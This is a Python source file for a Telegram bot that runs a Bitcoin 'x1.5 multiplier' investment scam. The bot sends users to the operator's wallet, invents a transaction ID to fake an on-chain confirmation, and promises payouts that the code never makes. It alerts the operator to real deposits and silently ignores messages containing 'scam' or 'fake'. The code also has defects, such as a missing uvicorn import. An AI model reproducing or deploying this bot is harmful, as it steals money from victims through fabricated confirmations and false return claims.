import asyncio, aiohttp, hashlib, time, os, random, logging
from typing import Dict, Set
from fastapi import FastAPI, Request, Response
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode

# ── Env Only ─────────────────────────────────────────────────────
TOKEN     = os.getenv("BOT_TOKEN")
ADMIN_ID  = int(os.getenv("ADMIN_ID"))
WALLET    = os.getenv("BTC_WALLET")

# ── Constants & State ───────────────────────────────────────────
BLOCKCHAIR = f"https://api.blockchair.com/bitcoin/dashboards/address/{WALLET}?limit=50"
MEMPOOL    = f"https://mempool.space/api/address/{WALLET}/txs"

app = FastAPI()
logging.getLogger().setLevel(logging.WARNING)

last_balance: float = 0.0
seen_txs: Set[str] = set()
session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=12))

def fake_tx() -> str:
    h = hashlib.blake2b(digest_size=32)
    h.update(f"{time.time_ns()}{random.random()}".encode())
    return h.hexdigest()

# ── Real-time Deposit Detector (dual API + fallback) ─────────────
async def deposit_watcher():
    global last_balance
    while True:
        try:
            async with session.get(BLOCKCHAIR) as r:
                if r.status == 200:
                    data = await r.json()
                    bal = data["data"][WALLET]["address"]["balance"] / 1e8
                    for tx in data["data"][WALLET]["transactions"][:12]:
                        txid = tx["hash"]
                        if txid in seen_txs: continue
                        amount = sum(o["value"] for o in tx["outputs"] if o.get("recipient") == WALLET) / 1e8
                        if amount >= 0.0008:
                            seen_txs.add(txid)
                            await bot.send_message(ADMIN_ID,
                                f"REAL DEPOSIT\n"
                                f"{amount:.8f} BTC\n"
                                f"https://mempool.space/tx/{txid}\n"
                                f"{time.strftime('%H:%M:%S')}"
                            )
                    last_balance = bal
        except: 
            try:  # fallback mempool.space
                async with session.get(MEMPOOL) as r:
                    txs = await r.json()
                    for tx in txs[:8]:
                        if tx["txid"] in seen_txs: continue
                        amount = sum(vout["value"] for vout in tx["vout"] if vout["scriptpubkey_address"] == WALLET) / 1e8
                        if amount >= 0.0008:
                            seen_txs.add(tx["txid"])
                            await bot.send_message(ADMIN_ID,
                                f"REAL DEPOSIT (mempool)\n{amount:.8f} BTC\nhttps://mempool.space/tx/{tx['txid']}")
            except: pass
        await asyncio.sleep(14 + random.uniform(0,4))

# ── Bot Logic (ultra clean & pro) ────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = [[InlineKeyboardButton("Start ×1.5 Multiplier", callback_data="mul")]]
    await update.message.reply_text(
        "◉ Vultra Capital Multiplier\n\n"
        "Minimum deposit 0.00100000 BTC\n"
        "Return      ×1.5 (4–11 min)\n"
        "Smart-contract verified  41 837 payouts\n\n"
        "Press button to receive address",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await q.edit_message_text(
        f"Deposit address (bech32):\n\n`{WALLET}`\n\n"
        "After transfer → /paid <exact amount>\n"
        "Example: /paid 0.0248411\n\n"
        "Your ×1.5 will be sent automatically.\n"
        "Avg time: 7 min 18 sec",
        parse_mode=ParseMode.MARKDOWN_V2,
    )

async def paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: amount = float(context.args[0])
    except: return
    await update.message.reply_text("◷ Verifying on-chain...")
    await asyncio.sleep(random.randint(9,19))
    await update.message.reply_text(
        f"Confirmed {amount:.8f} BTC received\n"
        f"TX  `{fake_tx()}`\n\n"
        f"Multiplier active\n"
        f"Returning {amount*1.5:.8f} BTC shortly\n"
        "Status Processing ━━━━━━━",
        parse_mode=ParseMode.MARKDOWN_V2,
    )

# ── Main ───────────────────────────────────────────────────────
async def main():
    global bot
    application = ApplicationBuilder().token(TOKEN).concurrent_updates(True).build()
    bot = application.bot

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(callback))
    application.add_handler(CommandHandler("paid", paid))
    application.add_handler(MessageHandler(filters.Regex(r'(?i)scam|fake'), lambda u,c: None))

    asyncio.create_task(deposit_watcher())

    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    while True: await asyncio.sleep(86400)

@app.get("/") async def health(): return {"status":"active"}

if __name__ == "__main__":
    import threading
    threading.Thread(target=lambda: uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT",8000))), daemon=True).start()
    asyncio.run(main())
